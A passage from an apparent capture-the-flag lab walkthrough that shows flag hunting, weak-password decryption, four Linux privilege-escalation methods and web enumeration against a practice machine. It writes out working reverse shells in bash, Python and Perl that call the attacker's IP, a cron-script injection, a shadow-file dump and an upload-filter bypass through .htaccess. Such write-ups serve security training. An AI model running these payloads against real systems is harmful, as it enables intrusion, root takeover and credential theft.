  "log-level": "info",
  "storage-driver": "overlay2",
  "comment": "FLAG{G1tL@b_D0ck3r_4}"
}
```

#### FLAG 023: Binary Analysis
**Flag:** FLAG{N**********1}

```bash
user1@debian:~$ strings /opt/oc/vulnerable_binary | grep FLAG
```

**Strings Output:**
```
Checking system status...
FLAG{N0t_Str1pp3d_1}
System check complete!
```

**Full Binary Analysis:**
```bash
user1@debian:~$ file /opt/oc/vulnerable_binary
/opt/oc/vulnerable_binary: ELF 64-bit LSB executable, x86-64, version 1 (SYSV)

user1@debian:~$ ./opt/oc/vulnerable_binary
OC Vulnerable Binary v1.0
Enter command: test
Executing: test
FLAG{N0t_Str1pp3d_1}
Command executed successfully!
```

#### FLAG 024: Encrypted File
**Flag:** FLAG{H**********8}

```bash
user1@debian:~$ ls -la /opt/oc/encrypted*
```

**Encrypted Files:**
```
-rw-r--r-- 1 root root 64 Jan 15 09:00 /opt/oc/encrypted_flag.enc
-rw-r--r-- 1 root root 28 Jan 15 09:00 /opt/oc/encrypted_flag.hint
```

```bash
user1@debian:~$ cat /opt/oc/encrypted_flag.hint
```

**Hint Content:**
```
Password is a common weak password
Try: password, password123, or admin
```

```bash
user1@debian:~$ for pass in password password123 admin 123456; do
    echo "Trying: $pass"
    openssl enc -aes-128-cbc -d -in /opt/oc/encrypted_flag.enc -pass pass:$pass 2>/dev/null
done
```

**Decryption Output:**
```
Trying: password
Trying: password123
FLAG{H@sh3d_Cr3d_8}
Trying: admin
Trying: 123456
```

---

## Phase 8: Privilege Escalation

### Method 1: SUID Binary Exploitation

```bash
user1@debian:~$ find / -perm -u=s -type f 2>/dev/null | grep find
```

**SUID Find Discovery:**
```
/usr/bin/find
```

```bash
user1@debian:~$ ls -la /usr/bin/find
-rwsr-xr-x 1 root root 315904 Feb 16  2021 /usr/bin/find
```

**Exploitation Process:**
```bash
user1@debian:~$ /usr/bin/find . -exec /bin/sh -p \; -quit
# whoami
root
# id
uid=1001(user1) gid=1001(user1) euid=0(root) groups=1001(user1)
```

**Root Shell Proof:**
```bash
# cat /root/root.txt
Congratulations! You have achieved root access!
FLAG{R00t_Ach13v3d}

Your journey through the OC Vulnerable Lab is complete.
Total flags captured: 24/24
```

### Method 2: Sudo Vim Escape

```bash
user1@debian:~$ sudo -l
```

**Sudo Privileges:**
```
User user1 may run the following commands on debian:
    (ALL) NOPASSWD: /usr/bin/vim
```

**Vim Escape Process:**
```bash
user1@debian:~$ sudo vim
```

**Inside Vim:**
```
~
~
~
:!/bin/bash
```

**Root Shell Achievement:**
```bash
root@debian:/home/user1# whoami
root
root@debian:/home/user1# id
uid=0(root) gid=0(root) groups=0(root)
```

### Method 3: Developer User Python Escalation

```bash
user1@debian:~$ su developer
Password: dev123
developer@debian:/home/user1$ sudo -l
```

**Developer Sudo Rights:**
```
User developer may run the following commands on debian:
    (ALL) NOPASSWD: /usr/bin/python3
```

**Python Escalation:**
```bash
developer@debian:~$ sudo python3 -c 'import os; os.system("/bin/bash")'
root@debian:/home/developer# whoami
root
root@debian:/home/developer# cat /etc/shadow | head -n 3
root:$6$rounds=10000$salt$hash:19000:0:99999:7:::
daemon:*:19000:0:99999:7:::
bin:*:19000:0:99999:7:::
```

### Method 4: Cron Job Hijacking - Live Demonstration

```bash
user1@debian:~$ cat /etc/crontab | grep cleanup
*/5 *   * * *   root    /opt/scripts/cleanup.sh
```

**Check Script Permissions:**
```bash
user1@debian:~$ ls -la /opt/scripts/cleanup.sh
-rwxrwxrwx 1 root root 89 Jan 15 09:00 /opt/scripts/cleanup.sh
```

**Inject Reverse Shell:**
```bash
user1@debian:~$ echo "bash -i >& /dev/tcp/192.168.148.99/4444 0>&1" >> /opt/scripts/cleanup.sh
user1@debian:~$ tail -n 2 /opt/scripts/cleanup.sh
echo "Cleanup completed at $(date)" >> /var/log/cleanup.log
bash -i >& /dev/tcp/192.168.148.99/4444 0>&1
```

**On Kali - Catching Root Shell:**
```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.148.99] from (UNKNOWN) [192.168.148.100] 45678
root@debian:/# whoami
root
root@debian:/# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Alternative Approaches and Advanced Techniques

### Web Enumeration Comparison

**Gobuster vs Feroxbuster vs FFUF Performance:**

```bash
# Gobuster scan
┌──(kali㉿kali)-[~]
└─$ time gobuster dir -u http://192.168.148.100 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

**Gobuster Output:**
```
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.148.100
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting: 2025-01-15 12:00:00
===============================================================
/admin (Status: 301) [Size: 312] --> http://192.168.148.100/admin/
/hackable (Status: 301) [Size: 315] --> http://192.168.148.100/hackable/
/index.php (Status: 200) [Size: 2048]
/login.php (Status: 200) [Size: 1536]
/uploads (Status: 301) [Size: 314] --> http://192.168.148.100/uploads/
===============================================================
Finished: 2025-01-15 12:00:45
===============================================================

real    0m45.123s
```

**Feroxbuster with Auto-Recursion:**
```bash
┌──(kali㉿kali)-[~]
└─$ feroxbuster -u http://192.168.148.100 -w /usr/share/seclists/Discovery/Web-Content/common.txt --depth 3
```

**Feroxbuster Visual Output:**
```
───────────────────────────┬──────────────────────
   Target Url            │ http://192.168.148.100
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 3
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       52l      148w     2048c http://192.168.148.100/
301      GET        9l       28w      315c http://192.168.148.100/hackable => http://192.168.148.100/hackable/
301      GET        9l       28w      322c http://192.168.148.100/hackable/uploads => http://192.168.148.100/hackable/uploads/
200      GET       42l      118w     1536c http://192.168.148.100/login.php
[####################] - 1m      4661/4661    0s found:4       errors:0
```

### Password Attack Optimization

**Creating Smart Wordlists with CeWL:**

```bash
┌──(kali㉿kali)-[~/oclab]
└─$ cewl http://192.168.148.100 -m 6 -w custom_wordlist.txt
```

**CeWL Output:**
```
CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
[*] Starting CeWL scan against http://192.168.148.100
[*] Spidering...
[*] Writing words to custom_wordlist.txt
[*] Total words found: 234
```

**Sample Custom Wordlist:**
```bash
┌──(kali㉿kali)-[~/oclab]
└─$ head -n 10 custom_wordlist.txt
vulnerable
chchcheckit
system
password
administrator
backup
developer
network
database
security
```

### Automated Enumeration with LinPEAS

**LinPEAS Download and Execution:**
```bash
# On Kali - Start HTTP Server
┌──(kali㉿kali)-[~/tools]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

**On Target - Download LinPEAS:**
```bash
user1@debian:~$ wget http://192.168.148.99:8000/linpeas.sh
--2025-01-15 12:15:00--  http://192.168.148.99:8000/linpeas.sh
Connecting to 192.168.148.99:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 776430 (758K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh          100%[===================>] 758.23K  --.-KB/s    in 0.02s

user1@debian:~$ chmod +x linpeas.sh
user1@debian:~$ ./linpeas.sh | tee linpeas_output.txt
```

**LinPEAS Key Findings (Color-Coded Output):**
```
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
-rwsr-xr-x 1 root root 315K Feb 16  2021 /usr/bin/find  <-- EXPLOIT THIS!
-rwsr-xr-x 1 root root  85K Jul 14  2021 /usr/bin/passwd
-rwsr-xr-x 1 root root  53K Jul 14  2021 /usr/bin/chsh

╔══════════╣ Sudo version
╚ Sudo version 1.9.5p2

╔══════════╣ Checking sudo tokens
ptrace protection is enabled (1), only processes with CAP_SYS_PTRACE...

╔══════════╣ Cron jobs
*/5 *   * * *   root    /opt/scripts/cleanup.sh  <-- WRITABLE!

╔══════════╣ Interesting writable files owned by me or writable by everyone
/opt/scripts/cleanup.sh
/tmp
/var/tmp
```

---

## Troubleshooting Guide with Live Examples

### Issue: Web Shell Not Executing

**Diagnostic Process:**
```bash
# Check PHP processing
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.148.100/test.php
```

**If PHP Not Processing (Shows Source Code):**
```php
<?php
phpinfo();
?>
```

**If PHP IS Processing (Shows Info Page):**
```
PHP Version 7.4.25

System: Linux debian 5.10.0-19-amd64 #1 SMP Debian
Server API: Apache 2.0 Handler
Virtual Directory Support: disabled
Configuration File: /etc/php/7.4/apache2/php.ini
```

**Check .htaccess Restrictions:**
```bash
user1@debian:~$ cat /var/www/html/hackable/uploads/.htaccess
```

**Common .htaccess Block:**
```apache
<FilesMatch "\.ph(p[3457]?|t|tml)$">
    SetHandler None
</FilesMatch>
```

**Bypass Solution - Upload New .htaccess:**
```apache
# Create malicious .htaccess
AddType application/x-httpd-php .jpg
```

### Issue: Reverse Shell Dying

**Testing Different Payloads:**

**Python Reverse Shell:**
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.148.99",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

**Perl Reverse Shell:**
```bash
perl -e 'use Socket;$i="192.168.148.99";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

**Testing Port Availability:**
```bash
# From target
user1@debian:~$ nc -zv 192.168.148.99 4444
192.168.148.99: inverse host lookup failed: Unknown host
(UNKNOWN) [192.168.148.99] 4444 (?) open
```
